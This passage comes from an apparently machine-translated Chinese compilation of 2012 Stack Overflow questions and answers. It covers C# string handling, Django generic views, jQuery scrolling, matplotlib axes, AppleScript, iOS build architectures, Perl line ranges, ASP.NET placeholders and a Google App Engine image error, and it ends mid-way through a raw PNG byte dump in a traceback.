        else
        {
            fTextSearch = phrase;
        }

        string[] errorChars = errorChars = new string[]
        {
            "'",
            "&"
        };

        StringBuilder sb = new StringBuilder();

        string[] splitString = fTextSearch.Split(errorChars, StringSplitOptions.None);

        int numNewCharactersAdded = 0;
        foreach (string itm in splitString)
        {
            sb.Append(itm); //append string
            if (fTextSearch.Length > (sb.Length - numNewCharactersAdded))
            {
                sb.Append(fTextSearch[sb.Length - numNewCharactersAdded]); //append splitting character
                sb.Append(fTextSearch[sb.Length - numNewCharactersAdded - 1]); //append it again
                numNewCharactersAdded++;
            }
        }

        string newString = sb.ToString();

        //Union with the full text search
        if (!string.IsNullOrEmpty(fTextSearch))
            {
                sql.AppendLine("UNION");
                sql.AppendLine(commonClause);
                sql.AppendLine(string.Format("AND CONTAINS(nt.text, '{0}', LANGUAGE 'English')", newString));
            } 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-25T13:52:07.833

这是一种方法。您可以通过传入一组字符然后测试这些字符而不是对括号进行硬编码来使其更加复杂。

```
var someString = "[Hello"
if(someString.contains("["))
{
    someString.Replace("[","");
}
if (someString.Contains("]"))
{ 
    someString.Replace("]","");
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-25T14:08:22.097

如果我理解正确，您只想删除不匹配的括号。

这将实现：

```
 public string MatchPair(string input, string item1, string item2)
    {
        var ix1 = input.IndexOf(item1);
        var ix2 = input.IndexOf(item2);

        if ((ix1 != -1) && (ix2 != -1))
        {
            return input;
        }

        if (ix1 == -1)
        {
            return this.CutString(input, ix2, item2);
        }

        if (ix2 == -1)
        {
            return this.CutString(input, ix1, item1);
        }

        return string.Empty;
    }

    public string CutString(string input, int ix, string item)
    {
        string left = input.Substring(0, ix);
        string right = input.Substring(ix + item.Length);

        return left + right;
    } 
```

这是我使用的一些测试数据：

```
 var str1 = "[hello]";
        var str2 = "[hello";
        var str3 = "hel]lo";
        var str4 = "hel[lo";

        var res1 = this.MatchPair(str1, "[", "]");
        var res2 = this.MatchPair(str2, "[", "]");
        var res3 = this.MatchPair(str3, "[", "]");
        var res4 = this.MatchPair(str4, "[", "]"); 
```

# django - Django以一种通用的方式上下关系

> ID：11651129
> 
> 赞同：0
> 
> 时间：2012-07-25T13:42:48.933
> 
> 标签：django, generics, views, relationships, django-generic-views

我正在尝试重写我的 Django 代码，以使其在所有级别上都尽可能通用。假设我有以下型号：

```
class Tvshow(models.Model):
    pass

class Season(models.Model):
    tvshow = models.ForeignKey(Tvshow)

class Episode(models.Model):
    season = models.ForeignKey(Season) 
```

电视节目有季节，季节有剧集。为简单起见，我省略了所有其他信息。

我的任何这些对象的详细视图现在可以使用 DetailView 处理任何模型。但我也想显示一个对象的关系，无论是父母还是孩子。假设您正在观看电视节目。我无法调用 tvshow.season_set.all() 来显示此信息，因为我的模板不知道它正在处理电视节目（电视节目也没有季节）。相反，我希望能够做到这一点：object.children_set.all()。

这样我就可以为这 3 个模型中的任何一个提供我的视图，并且它会起作用。这可能吗？

ps 我知道对象。部分工作，但孩子们也会部分工作吗？我能想出一个丑陋的技巧：使用 relation_name 属性来命名所有关系子项。我想它会起作用，但这不是我想要的方向。

视图.py：

```
from django.views.generic.detail import DetailView

class ObjectDetailView(DetailView):  
    template_name = "detail.html" 
```

网址.py

```
from tvshows.views import ObjectDetailView
from tvshows.models import Tvshow

urlpatterns = patterns('tvshows.views',
    url(r'^(?P<pk>\d+)/$', ObjectDetailView.as_view(model = Tvshow), name='detail'),
) 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-25T15:03:24.593

不幸的是，不，没有办法做到这一点。但是，如果您的唯一目标是拥有一个适用于所有三个视图的视图，您可以执行以下操作：

```
class MyDetailView(DetailView):
    ...
    def get_context_data(self, **kwargs):
        context = super(MyDetailView, self).get_context_data(**kwargs)
        if hasattr(context['object'], 'season_set'):
            context['children'] = context['object'].season_set.all()
        elif hasattr(context['object'], 'episode_set'):
            context['children'] = context['object'].episode_set.all()

        return context 
```

# shell - 监视文件夹并执行命令

> ID：11651131
> 
> 赞同：0
> 
> 时间：2012-07-25T13:42:55.750
> 
> 标签：shell, automation, virtualbox

我正在寻找一种解决方案来监视文件夹以创建新文件，然后在创建的文件上执行 shell 命令。场景是我有一台运行虚拟机的主机，它们共享一个文件夹。我想要的是当我在我的主机上的共享文件夹中创建或复制一个新文件时，在 VM 上，系统应该能够检测到这些更改。我已经尝试过 incron 和 inotify 但它们仅在我进行复制时才起作用，在 VM 中以用户身份创建。谢谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-25T22:35:06.077

**此答案中的**方法 1可能会有所帮助：** [Bash 脚本、监视文件夹、执行命令](https://stackoverflow.com/a/6475265/520398)
只需在您的 VM 中运行该脚本，您就应该能够检测到主机所做的更改。**

# javascript - jQuery在mousedown上平滑滚动

> ID：11651132
> 
> 赞同：1
> 
> 时间：2012-07-25T13:43:02.120
> 
> 标签：javascript, jquery, jquery-animate

有没有办法使用 jquery animate 模拟滚动类型选项？现在它只是滚动相当于你给它的值（如下所示）。我不能在这个 div 上做一个自定义滚动条，因为它主要是为了使它易于在移动设备上滚动。因此，下面的示例将滚动购买它从顶部开始 -100 像素，然后停止并重复。有什么简单的方法可以使这种过渡继续下去。

```
jQuery(".down-arrow").mousedown(function(){
        var height = jQuery("#technology_list").height();
        //if($('#technology_list').offset().top 
        scrolling = true;
        startScrolling(jQuery("#technology_list"), "-=100px");
        //jQuery("#technology_list").animate({top: '-=25'});
    }).mouseup(function(){
        scrolling = false;
    });

    function startScrolling(obj, param)
{
    obj.animate({"top": param}, "fast", function(){
        if (scrolling)
        {
                startScrolling(obj, param);
        }
    }); 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-07-25T14:11:37.047

[jsFiddle 在行动中展示它](http://jsfiddle.net/PM36W/)

最简单的答案是您要确保将动画设置为**easing**设置为**linear**。

```
.animate( { /* whats animating */ } , duration: 'XXX', easing: 'linear'
   ,function () { /* callback */ } 
); 
```

奇怪的是，当 animate() 忽略缓动时，它的默认值实际上不是线性的（基本上将其关闭）。默认是标准缓动，它消除了“平滑度”，即我们想要的整个动画的一种速度。

这是一个示例，因此您可以看到它：

```
var end = 20;

for (i = 0; i < end; i++) {
  $('#test').animate({'top': '+=50px'}, 500, 'linear', function () {
      // callback
  });
} 
```

​</p>

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-07-25T13:52:59.927

前阵子也遇到了同样的问题，把这个放在一起，基本上就是无限滚动的解决方案：

**编辑：**这是适合您的用例的代码：

```
// Assuming you also have/want a scroll up
jQuery(".up-arrow").mousedown(function() {
    // You don't need to use jQuery instead of $ inside of jQuery defined functions 
    var offset = $("#technology_list").offset();
    var topValue = offset.top;
    if ((topValue * 2) < 1000) speed = topValue * 3;
    else if ((topValue * 2) < 500) speed = topValue * 4;
    else if ((topValue * 2) < 100) speed = topValue * 8;
    else speed = topValue * 2;

    $("#technology_list").animate({
        top: 0
    }, speed);

}).mouseup(function() {
    $("#technology_list").stop();
});

jQuery(".down-arrow").mousedown(function() {
    var offset = $("#technology_list").offset();
    var topValue = offset.top;
    var height = $("#technology_list").height();
    if (((height - topValue) * 2) < 1000) speed = (height - topValue) * 2;
    else if (((height - topValue) * 2) < 500) speed = (height - topValue) * 2;
    else if (((height - topValue) * 2) < 100) speed = (height - topValue) * 2;
    else speed = (height - topValue) * 2;

    $("#technology_list").animate(function() {
        top: $("#technology_list").height()
    }, speed);

}).mouseup(function() {
    $("#technology_list").stop();
});​ 
```

编辑结束。

```
$(".scroll-left").hover(function() {

    if (($(this).parent().scrollLeft() * 2) < 1000) speed = $(this).parent().scrollLeft() * 3;
    // If it is less than 500 pixels from the edge, then it takes 3 times as long as the scrollLeft value in milliseconds. (Sorry about the if's being hard to read)

    else if (($(this).parent().scrollLeft() * 2) < 500) speed = $(this).parent().scrollLeft() * 4;
    // And if it is less than 250  pixels, it takes 4 times as long

    else if (($(this).parent().scrollLeft() * 2) < 100) speed = $(this).parent().scrollLeft() * 8;
    // Less than 50, it takes 8 times as long

    else speed = $(this).parent().scrollLeft() * 2;
    // And if it is more than 500 run it at 2 milliseconds per pixel

    $(this).parent().animate({
        scrollLeft: 0
    }, speed);
    // Scroll it to the beginning at the above set speed
}, function() {
    $(this).parent().stop();
    // On mouseOut stop the animation
});

$(".scroll-right").hover(function() {
    parent = $(this).parent()[0];
    parentWidth = $(this).parent()[0].scrollWidth;
    // Cache parent and parentWidth (stops delay on hover)

    if (((parentWidth - parent.scrollLeft) * 2) < 1000) speed = (parentWidth - parent.scrollLeft) * 2;
    // Pretty much the same thing as before but this time it sort of makes a "scrollRight"

    else if (((parentWidth - parent.scrollLeft) * 2) < 500) speed = (parentWidth - parent.scrollLeft) * 2;

    else if (((parentWidth - parent.scrollLeft) * 2) < 100) speed = (parentWidth - parent.scrollLeft) * 2;

    else speed = (parentWidth - parent.scrollLeft) * 2;

    $(this).parent().animate({
        scrollLeft: $(this).siblings(".row-scroll").width()
    }, speed);
    // Same thing as before, but this time we scroll all the way to the right side
}, function() {
    $(this).parent().stop();
});​ 
```

这是直接从我的代码中复制的，但这个想法是合理的，当它靠近边缘时，乘法会减慢它的速度。

它并不完美或接近它，如果你想要更精细的东西，那么你应该尝试[暂停](http://tobia.github.com/Pause/)

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-07-25T13:50:57.987

您可以尝试使用 jQuery 插件 ScrollTo：[http ://demos.flesler.com/jquery/scrollTo/](http://demos.flesler.com/jquery/scrollTo/)

# python - 添加倾斜（浮动）轴以覆盖标准轴

> ID：11651134
> 
> 赞同：3
> 
> 时间：2012-07-25T13:43:05.037
> 
> 标签：python, matplotlib, axes

我正在寻找一种方法来添加一个额外的轴对，倾斜和原点移位。它们应该被添加到已经用于显示图像的轴上。

结果应该看起来接近

```
 y         x+y
    |\       /
  9 | + -2  + 18
    |  \   /
    |   \ /     
  8 |    x        
    |   / \
    |  /   \
  7 | + 14  \x-y
    |/       + 2
    +--------------------- x
    7    8    9 
```

（不幸的是，我不允许上传我创建的实际图像）

倾斜轴的中心应该定位在某个坐标 (x0,y0)，在我的情况下是 (8,8)，我希望能够像普通轴一样对待新轴，即使用类似的函数set_xlabel，网格等。

我试图使用 Affine2D 变换、浮动轴和脊椎来获得结果，但无法正确处理这个问题。非常欢迎任何帮助。

图像的不重要部分是使用完成的

```
import numpy as np
import matplotlib.pyplot as plt

X = Y = np.linspace(7, 9, 100)
XX, YY = np.meshgrid(X,Y)
Z = np.exp(-(XX-XX.mean())**2/1 - (YY-YY.mean())**2/5)

fig = plt.figure()
ax = fig.add_subplot(111)
ax.imshow(Z, origin='lower', extent=[X.min(), X.max(), Y.min(), Y.max()])
ax.set_xlabel("x")
ax.set_ylabel("y")
ax.grid(True, color='white') 
```

提前致谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-25T19:18:16.380

这是 matplotlib 的一个难题，与我过去遇到的类似。我知道，通过大量的启动时间，我相信使用浮动轴可以完成您所要求的事情。

[我曾经在 matplotlib 开发邮件列表http://old.nabble.com/Drawing-arbitrary-Axis-on-a-plot-p33625041.html](http://old.nabble.com/Drawing-arbitrary-Axis-on-a-plot-p33625041.html)上对此展开讨论，但遗憾的是没有人有任何答案。

我将尝试制作一个浮动轴的工作示例，但不知道我会成功...

# javascript - JavaScript 中的 AppleScript 字符串连接

> ID：11651136
> 
> 赞同：0
> 
> 时间：2012-07-25T13:43:16.707
> 
> 标签：javascript, dom, applescript

我正在尝试自动化 Google Docs 登录过程，但我认为可行的方法一无所获。代码如下。

```
display dialog "Username" default answer ""
set Username to the result
display dialog "Password" default answer "" with hidden answer
set myPassword to the result
tell application "Google Chrome"
    tell window 1
        set newTab to make new tab with properties {URL:"https://accounts.google.com/ServiceLogin?service=writely&passive=1209600&continue=https://docs.google.com/?tab%3Dwo%23&followup=https://docs.google.com/?tab%3Dwo&ltmpl=homepage"}
        repeat 50 times --wait until the page loads...
            delay 0.1
        end repeat
        tell active tab
            execute javascript "document.getElementById('Email').value = '" & Username & "'"
        end tell
    end tell
end tell 
```

有问题的代码是`execute javascript "document.getElementById('Email').value = '" & Username & "'"`. 每当我尝试使用字符串连接执行 JavaScript 时，都会收到以下错误：“无法将 {text returned:"hello", button returned:"OK"} 转换为 Unicode 文本类型。”

我还尝试使用以下内容，而不是使用命令更改字段的
`execute javascript "document.getElementById('Email').click()"`值`keystroke`。然而，这也没有奏效。我做错了什么，还是只是 AppleScript？

值得注意的是，以下代码有效
`execute javascript "document.getElementById('Email').value = '" & "Hello" & "'"`。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-25T14:42:35.293

因为`display dialog`命令的结果是一条记录。

要获取字符串，请使用：

```
display dialog "Username" default answer ""
set Username to text returned of the result
display dialog "Password" default answer "" with hidden answer
set myPassword to text returned of the result 
```

# iphone - 应用程序无法在 iOS 4.2 上运行，架构问题

> ID：11651150
> 
> 赞同：0
> 
> 时间：2012-07-25T13:43:48.000
> 
> 标签：iphone, ios, xcode4.3, xcodebuild, armv6

我有一个在 Xcode 4.3.2 中开发的应用程序。我将基本 SDK 用作 5.1。该应用程序在 iOS 5.0 及更高版本中安装良好。但是我需要支持iOS 4.0 及以上。

我使用的编译器是 Apple LLVM 编译器 3.1。

我已将 armv6 和 armv7 添加到架构中（见附图![图片](../Images/524ad80bb0351b99bd5c43debf4b6b72.png)）

我创建了一个 AdHoc 构建。当我使用 iTunes 同步它时，它与 iOS 5.0 及更高版本同步良好，我没有在 iOS 4.3 中测试过，但它没有安装在 iOS 4.2.1 中。它给出了这个错误：

应用程序“App Name”无法安装在 iPod“iPod Name”上，因为它与此 iPod 不兼容。

有什么想法吗？

谢谢。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-26T06:48:29.953

您应该`armv7`从`Required device capabilities`中删除`info.plist`。

这限制了应用程序安装在没有 ARMV7 处理器的设备上，例如旧的 iPad 触摸屏和 iPhone。

# perl - 从文件中读取第 3 到 5 行，如何将这些行号转换为变量？

> ID：11651151
> 
> 赞同：2
> 
> 时间：2012-07-25T13:43:49.463
> 
> 标签：perl

我对 perl 非常陌生，但我只是想打开一个文件并从中读取一些行。

到目前为止的代码如下所示：

```
open FILE, "file.txt" or die "can not open file"; 
while (<FILE>) { 
  print if ($.== 3..5)
} 
```

但我需要能够更改要获取的行。所以那些 3 和 5 的数字需要是变量。

也有人可以帮助我更好地理解这段代码吗？我想知道什么美元。确切地说，我将如何将打印命令替换为将其放入数组或其他内容以进一步处理这些行？

谢谢！

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-07-25T13:53:15.840

请注意语法。运行您的示例`perl -MO=Deparse,-p`表明 perl 将其解释为

```
(open(FILE, 'file.txt') or die('can not open file'));
while (defined(($_ = <FILE>))) {
((($. == 3) .. 5) and print($_)); 
```

幸运的是，范围运算符会执行您希望它执行的操作，因为默认情况下`..`使用`$.`(输入行号)。

要使用变量而不是常量，只需使用

```
print if $. == $x .. $. == $y; 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-25T22:02:51.090

```
$ perl -E'say for "aa".."ah"' | perl -ne'print if 3..5' 
```

`$.`当您根据[文档](http://perldoc.perl.org/perlop.html#Range-Operators)使用常量时，使用是不必要的，但是当您使用变量时，您必须明确提及它：

```
perl -E'say for "aa".."ah"' | perl -ne'BEGIN{($f,$t) = splice@ARGV,0,2;}print if ($.==$f)..($.==$t)' 3 5 
```

# asp.net - 为什么 asp:ContentPlaceHolders 有开始和结束标签？

> ID：11651162
> 
> 赞同：-4
> 
> 时间：2012-07-25T13:44:29.450
> 
> 标签：asp.net

我试过谷歌搜索。（和 MSDN-ing。）

我也尝试将文本放在那里，但没有任何效果。

编辑：我的意思是：与单标签元素相反：`<asp:ContentPlaceHolder ... />`

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-07-25T14:01:18.333

它用于指定默认内容。

```
<asp:ContentPlaceHolder>
   <!-- what's in here is the default content if the placeholder's content never gets set elsewhere-->
</asp:ContentPlaceHolder> 
```

[这是一个例子](http://www.asp.net/web-forms/tutorials/master-pages/multiple-contentplaceholders-and-default-content-vb)。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-07-25T13:50:55.560

IT 不必打开和关闭。见下文：

```
<asp:ContentPlaceHolder /> 
```

以上将起作用。

# python - 从数据存储中检索图像时出现此错误

> ID：11651164
> 
> 赞同：1
> 
> 时间：2012-07-25T13:44:33.370
> 
> 标签：python, google-app-engine

我是谷歌应用引擎的新手。

我已将图像存储在 blob 字段中。我正在尝试获取显示错误的图像。

下面我粘贴了我的代码和输出。

主文件

```
import cgi 
import webapp2
from google.appengine.api import users
from google.appengine.ext.webapp.template \
    import render
from os import path
from google.appengine.ext import db
from google.appengine.api import images
import urllib
import re
import datetime

class imgstore(db.Model):
    name=db.StringProperty(multiline=True, default='')
    image=db.BlobProperty()

class MainHandler(webapp2.RequestHandler):
    def get(self):
        moviequery=db.GqlQuery('SELECT * FROM imgstore')
        context={
                'list':moviequery
                }   
        tmpl = path.join(path.dirname(__file__), 'static/html/index.html')
        self.response.out.write(render(tmpl, context))

    def post(self):
       name1 =images.resize(self.request.get("file"), 32, 32) 
       formdata = db.Blob(name1)
       insert = imgstore()
       insert.name="name"
       insert.image=formdata
       insert.put()

routes=[
        (r'/', MainHandler),
        ]
app = webapp2.WSGIApplication(routes=routes,debug=True) 
```

索引.html

```
> <html>
>     <head><title>test</title></head>
>     <body>hello
>        <form id="form" action="/" method="post" ENCTYPE="multipart/form-data">
>            <input type="file" name="file" >
>            <input type="submit" name="submit">
>        </form>
>        {% for lis in list%}
>        <img src="{{lis.image}}">
>        {% endfor %}
>     </body>
>         </html> 
```

输出

```
Traceback (most recent call last):
  File "/Applications/GoogleAppEngineLauncher.app/Contents/Resources/GoogleAppEngine-default.bundle/Contents/Resources/google_appengine/lib/webapp2/webapp2.py", line 1536, in __call__
    rv = self.handle_exception(request, response, e)
  File "/Applications/GoogleAppEngineLauncher.app/Contents/Resources/GoogleAppEngine-default.bundle/Contents/Resources/google_appengine/lib/webapp2/webapp2.py", line 1530, in __call__
    rv = self.router.dispatch(request, response)
  File "/Applications/GoogleAppEngineLauncher.app/Contents/Resources/GoogleAppEngine-default.bundle/Contents/Resources/google_appengine/lib/webapp2/webapp2.py", line 1278, in default_dispatcher
    return route.handler_adapter(request, response)
  File "/Applications/GoogleAppEngineLauncher.app/Contents/Resources/GoogleAppEngine-default.bundle/Contents/Resources/google_appengine/lib/webapp2/webapp2.py", line 1102, in __call__
    return handler.dispatch()
  File "/Applications/GoogleAppEngineLauncher.app/Contents/Resources/GoogleAppEngine-default.bundle/Contents/Resources/google_appengine/lib/webapp2/webapp2.py", line 572, in dispatch
    return self.handle_exception(e, self.app.debug)
  File "/Applications/GoogleAppEngineLauncher.app/Contents/Resources/GoogleAppEngine-default.bundle/Contents/Resources/google_appengine/lib/webapp2/webapp2.py", line 570, in dispatch
    return method(*args, **kwargs)
  File "/Users/saravase/test/main.py", line 44, in get
    self.response.out.write(render(tmpl, context))
  File "/Applications/GoogleAppEngineLauncher.app/Contents/Resources/GoogleAppEngine-default.bundle/Contents/Resources/google_appengine/google/appengine/ext/webapp/template.py", line 92, in render
    return t.render(Context(template_dict))
  File "/Applications/GoogleAppEngineLauncher.app/Contents/Resources/GoogleAppEngine-default.bundle/Contents/Resources/google_appengine/google/appengine/ext/webapp/template.py", line 172, in wrap_render
    return orig_render(context)
  File "/Applications/GoogleAppEngineLauncher.app/Contents/Resources/GoogleAppEngine-default.bundle/Contents/Resources/google_appengine/google/appengine/_internal/django/template/__init__.py", line 173, in render
    return self._render(context)
  File "/Applications/GoogleAppEngineLauncher.app/Contents/Resources/GoogleAppEngine-default.bundle/Contents/Resources/google_appengine/google/appengine/_internal/django/template/__init__.py", line 167, in _render
    return self.nodelist.render(context)
  File "/Applications/GoogleAppEngineLauncher.app/Contents/Resources/GoogleAppEngine-default.bundle/Contents/Resources/google_appengine/google/appengine/_internal/django/template/__init__.py", line 794, in render
    bits.append(self.render_node(node, context))
  File "/Applications/GoogleAppEngineLauncher.app/Contents/Resources/GoogleAppEngine-default.bundle/Contents/Resources/google_appengine/google/appengine/_internal/django/template/__init__.py", line 807, in render_node
    return node.render(context)
  File "/Applications/GoogleAppEngineLauncher.app/Contents/Resources/GoogleAppEngine-default.bundle/Contents/Resources/google_appengine/google/appengine/_internal/django/template/defaulttags.py", line 173, in render
    nodelist.append(node.render(context))
  File "/Applications/GoogleAppEngineLauncher.app/Contents/Resources/GoogleAppEngine-default.bundle/Contents/Resources/google_appengine/google/appengine/_internal/django/template/__init__.py", line 847, in render
    return _render_value_in_context(output, context)
  File "/Applications/GoogleAppEngineLauncher.app/Contents/Resources/GoogleAppEngine-default.bundle/Contents/Resources/google_appengine/google/appengine/_internal/django/template/__init__.py", line 827, in _render_value_in_context
    value = force_unicode(value)
  File "/Applications/GoogleAppEngineLauncher.app/Contents/Resources/GoogleAppEngine-default.bundle/Contents/Resources/google_appengine/google/appengine/_internal/django/utils/encoding.py", line 88, in force_unicode
    raise DjangoUnicodeDecodeError(s, *e.args)
DjangoUnicodeDecodeError: 'utf8' codec can't decode byte 0x89 in position 0: invalid start byte. You passed in '\x89PNG\r\n\x1a\n\x00\x00\x00\rIHDR\x00\x00\x00 \x00\x00\x00\x14\x08\x06\x00\x00\x00\xec\x91?O\x00\x00\x066IDATx\x9c\xad\xd6i\x8c\x95W\x19\x07\xf0\xffs\xce}\xdf\xf7ns/\xb3\xdc;03\xcc\xc0\xb0\xcc\x1d\x8a\xb4\x99\xb2:\x05KS\xa8\xa4M\x00\x95\x8e\xd3\xfa\xc1%\xe9W5\xa9\xf1\x83\x89F\xe3\x17hP\x96\x84hCB\x14k\xc4b\x04\xaa\xb5j\xd0V\xa4\xd0\xa1(\x85P\x18(\xcc\xc2,\xf7\xce\x1d\xee\xdc}}\xcf\xf3\xf8\x81E\x88\xadv\xf1|?y~\xf9\xff\x9f\x9c\x1c\x12\x11\x00\x80\x08+aQJ+\x06\x88\x01\xa0\\\xae\xea\xb1\xe1+\xab*\xf9\xcc\xa2\xba\xc6\xd6\xe3\xed\xf3\xe7\x8d\x01 aV\x02\x81R\xda\xe0\x13\x1ebf\x05\x08\x88\x14\x03\x801\x8c\xc4\x8d\xe1\xee\x91\xc1\xb7\xb6M\\;\xf5\xb9Rvt)\x8c\xe8\x91\x1b\x95t\xe3\xdc\x15\xbf\xda\xf4t\xff\xee\x8eEK.\x03 \x11&\x11\xa1O\x02!\x11!\x01djrb\xee\x85\xb7^\xdf:6x\xaa_J#+,OI\xdb\xb6\x03\xed\xb1\x85\xd9\x15\x9fch|<I\xa9\x8c\xc7\x9d\xbd\xe0\x91\xa3\xab7\xf4m\xef\xfaT\xcf\x19\xa5\x08"\xa2DX)\xa5\xdd\x8f\x0c\x18\xba\xf4^\xec\x97\xfb^\xd8\x11\xf2\x8fo\xf0\xeb\x927P\xe7@\xdb>Q\x8a\x8cV\xae\xb2-V\x8e#\x10\xe3\nC\x99\xe4tE\xb3\xa9\x10\xa0\xc4\xd8\xb1\xe3]\xbd\xcfl_\xb1\xfa\x91\xe3Z+\x11\x11%\xccJie\x00\x92\x0f\x05\xb8\xfc\xee\xa5\r\x07\xf7>\xff\xa7\xdc\xf8$Z\xe6\xd4\xbb\xd19\x01j\x8e\xdaZ\x00@\x04\x86\x05\x95\xb2\x0b\xd75\xf0X\n\xa1:\r\xdb\xb1\xdcBA\xa9|6\xa7\xd2\x99<\x9cP\xe7\xe9\x07{\xb7m\x7f`\xe5\xe3\xaf8^\xdb\x88\x08\t\xb3VJ\x19\xd0\x7f\x87\x90\x88`\xaa4\xb8\xe3\xec\x89C\xdf\x1a8v\xb6\x96\x9d\x98\xb0ZZ\x03X\x1c\x8b\xc00\xa1RfX\xb6\x86\xe5\x01<\x1e\x8dR\xb9\x8aJ\xc5\xc0\xf1\x06\xe1x\xaaF\xab\x1a\x15KU\x8aON\x13\xac\xf9\xe7\x97\xac\xe9\xdb\xbe\xe6\xf1\'\x0e;^_\xf5\x0e\x84\x942\xf4\x01\x10\x12f\xb8\x02gd\xe4\xd8I\xedM<|\xfdb\xbav\xf27oX\xd5\\\x12\xdd\xb1F45\xcfB6\'0\xb5*|\xfe H\tr\xe9\x0cf\xd5\xdb(\x95\xca(\x96\x14\x0c+\xe3\xa8\x12\x88\\\x95L\xe6\xc9\x0e\xce\xbd\xb2\xacw\xeb\x0b=\x8fn~\xc9\xf1\x05K\x10!\x16\xd6D\xff\t!fVD\xc4\xc9\x1b\xc3\xb1k\xe7\xf7\xfc\xad\xe7\xb3]\x91\xa2;\xcf}\xe3\xc8\xdb\xfa\xc4\x91?\x92\xc3\x05,\x8e\xb5"\x10\xf2\x02b \x0cd\xf35\x84\xc3\x01dRi\x04\x82\x16\x08\x04f\x03\xcbr\rA!\x93.\xa8\xa9D\x96\xac@\xf3\xf0\xb2\xb5\x9f\xff\xf1\xea\x8d\xdb\x0e\xd4\x85g\xe5\x00!\xe6\xfb!$"\x10\x11ED<=v}\xf1\xd4\xd0\xfe\x83\xb3c\xee\xca\x86\xc8g\xccT\x9a\xf0\xfb\x9f\xbd\xa2/\xfe\xfdm\xb4D\x1dD"Ax}!T\xdd*\xaa\x15\x83B\xae\x86`\xd0F\xa4\xb9\x1e\xf9\xecMT\xaa.&\xe3%h\xcba\xadXl\x95W\xe5R\x91*\xdc4\xb1\xf0\xe1/\xec\xd9\xb8\xf5\x8b/\xce\x8a6\xcc\x88\x08\xdd\x99I\xff~\x88D\x11\x91T\xcbU\x15\xbfz\xec\xeb.\xff\xf9\xfb\xd1E\x9d\xc1\xa0\xbf\xc7\x0c\r\x0f\xd1\xb1\xfd\xaf\xaa\xf3\xa7\xaf`v\xc4\x8bh4\x00\xcbr\xe0\xf5Y "d3\x15\x14+\x04\xad\x05\xe1\x90\rK\x0b|^A6W\xe1t\xc6p\xb1lt\xb1X\xa6j-\x90\\\xbf\xb9o\xcf\xba\xa7\x9e\xdd\xd7\xd0T\x9f\x02\x84\xee\x02\xee" \x04Rf&>:/9rp\x97\xbfqt\xf3\x9c\xce\x1e\xd1j\x8e9w\xfa\xac>\xfc\xe2_(~#\x89\xeeX\x14A\xbf\x03Q6\xf2\x05\x83P\x90\xe1\xf1\x10<\x9a\x90\xcd\xd6\x90H\xe6\x90\xc9\xb9\xc8\x97\x04\x8e\xad9\x1a\xf1K\xd0g\xd4\xe8p\x9c\xaa\xd2\x9cZ\xf7d\xff\x0f\xb7|\xe5\xb9\xbd\xf7\x01n3n\xc7\xa3\xd8\xb8\x90\xf8\xb5\xd7\xb7\xe6S/\xef\x8a,\xd0\xed\r\xd1\x1e6F\xc9_\x8f\x9e\xd6\x87\x0f\x9cB\xb9P\xc4\xc2\x05\x8dhj\x0c\xa2\\)#\x9d1\x98\x9e\xa9\xa0P\xac\xc2\xb1=\xf0\xfb-\xd4\x05m\x84\x02\x1a\xa5R\x05#\xe3y\xa9Q\xc04DZt]\x98\xe8\xab\xdf\xfc\xc1\x86\xf7\x01\xdcI\x83\x15\x01\x04R\xa6\x90\xc9\xd4%\xaf\xff\xfa;\xa0\x13\xdfhZ\xd0\xe6\x04\xeb\x16\x98\xd4t\x86\x0e\xfd\xf4\xa4:z\xe8\x9f\xd0\x9a\xd1\xda\x12\x023A\x88\x00\x114\xd4\xfb0\xbb\xc9\x01\xc4 q\xb3\x8c\xa1q\x17\xb67\x8c\x9e5\x8by\xd5\xc6v\xb5p\xe9\x923\x91\xe0\x965\x1f\x08\xb8\x07\xa2om,q:~56s\xe3\xe7?\xb2}W6E\x17v\x88\xe5\x8d\xf2\xe8\xa5\xb4:\xb0\xf7,]\xf8\xc7\x08b]MplA\xa1PF8\xe4\xc1\xf4L\x19\xc94\x83t\x1d:\x16\xb7\xe0\xb1M\xed\xe8^\x1a2\\\xcdh+\xd0\xfftSt\xf9\xcb\xff\x13p{7\x08\xb8S\x8b\xc8\xf8\xe5\xe3[\xf2\x93\x07v\x86\xc3\xc9\xce\xe6\xaen\xf6\x84\xda\xe4\xd4kc\xfa\xc8/."\x9e\x98\x81\xd7o!\x9f\xad@\xd96b=\xf3\xf1\xe9\xc7\xda\xd0\xd5m\xc3\xaa\x95j\xf1+\xa3\xd6t\xb2\xf5\xc4\xba\xfe\xdd\xeb\xb4\x87\xe8C\x01\xee\xad\x05\x00\x11)\x93\xcf\xe6\xfcc\xe7\x0e>_\x9a8\xfc\xed\xb9\xb1\xa0\xbf\xe9\xa1\xe5&\x9d\x04\xbd\xf9\x87\x1959\xec"S\xcb\xe0\xa1G\xdb\xd0\xd5\xe9\xc2\xaa\xa487]\xe4\xe1\x8b\xe3\x9e\xab\x97s\xc5\xb5\xcf\xfcd\xfd\x03+V\x0e\x08\xb3\xfaH\x80\xf7\xabej\xf4Z\xe7\xe8\xc0\xae=\xb3\x02\xef<\xd9\xfe`\x07\xdb\x8d\xcd29\xdd\xa1\xb57\x07\xdbMq\xe2\x9d\xabr3\x91UC\x83q\xaa\xd0\xa23k\xb7}\xf7\xb9E\xcb\x96\x9f\x13aE\xa4\xf8c\x01n!\x84\x00\xd6D\xda\x18\x86\x8c\x9c\xfdm\xdf\xd4\x85}\xbb[Z3\xcds\xd7?\xcb\x89\xa1Q\x0c\x0f\x0c\xd0{\xef&\xa8(-C\xb1\xde\xaf}o\xd5\xc6\xbe\x97\x1c\xc7faV\xa4n\xfd?>6\xe0\x9e4\xee\xd6\x92\x99N6^xm\xe7\x0e\xe2s_N\xa5\xf2*1\xa9G\xda\x96\xf5\xed\xec}\xeaK\xfb\xeb\xc2\xa1\x92\x08k\x08\x